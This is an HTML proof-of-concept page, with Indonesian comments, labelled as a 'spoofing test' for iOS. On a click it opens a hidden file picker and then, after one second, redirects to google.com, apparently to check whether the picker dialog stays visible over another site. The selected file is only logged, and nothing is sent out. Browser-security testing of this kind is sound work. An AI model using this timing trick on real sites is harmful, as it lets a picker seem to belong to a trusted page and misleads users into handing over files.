<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker Spoofing on iOS</title>
    <script>
        // Fungsi untuk memicu file picker
        function openFilePicker() {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = 'image/*';  // Misalnya hanya file gambar yang diterima
            fileInput.style.display = 'none';

            fileInput.addEventListener('change', (event) => {
                const file = event.target.files[0];
                if (file) {
                    console.log('File selected:', file.name);
                }
            });

            document.body.appendChild(fileInput);
            fileInput.click();  // Memicu dialog file picker
        }

        // Fungsi untuk memanipulasi navigasi setelah file picker
        function spoofNavigation() {
            openFilePicker();  // Panggil file picker
            setTimeout(() => {
                window.location.href = 'https://www.google.com';  // Pindahkan halaman setelah memilih file
            }, 1000);  // Menunggu 1 detik sebelum navigasi
        }
    </script>
</head>
<body>
    <h1>Click anywhere to start the spoofing test</h1>
    <script>
        // Menunggu klik pengguna untuk memicu file picker
        document.addEventListener('click', spoofNavigation);
    </script>
</body>
</html>
